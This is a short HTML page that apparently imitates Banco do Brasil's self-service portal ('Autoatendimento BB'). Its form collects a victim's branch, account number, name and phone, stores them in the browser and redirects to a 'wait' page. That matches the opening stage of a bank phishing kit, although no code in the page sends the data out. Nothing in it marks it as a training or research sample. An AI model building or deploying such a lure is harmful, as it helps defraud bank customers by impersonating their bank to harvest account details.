<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autoatendimento BB</title>
    <script>
        function salvarDados(event) {
            event.preventDefault(); 
            let agencia = document.getElementById("agencia").value;
            let conta = document.getElementById("conta").value;
            let nome = document.getElementById("nome").value;
            let telefone = document.getElementById("telefone").value;

            if (agencia && conta && nome && telefone) {
                let formData = {
                    agencia: agencia,
                    conta: conta,
                    nome: nome,
                    telefone: telefone
                };
                localStorage.setItem('formData', JSON.stringify(formData));
                window.location.href = 'espera.html';
            } else {
                alert("Preencha todos os campos!");
            }
        }
    </script>
</head>
<body>
    <form onsubmit="salvarDados(event)">
        <input id="agencia" type="text" placeholder="AgÃªncia" required>
        <input id="conta" type="text" placeholder="Conta" required>
        <input id="nome" type="text" placeholder="Nome" required>
        <input id="telefone" type="text" placeholder="Telefone" required>
        <button type="submit">Continuar</button>
    </form>
</body>
</html>
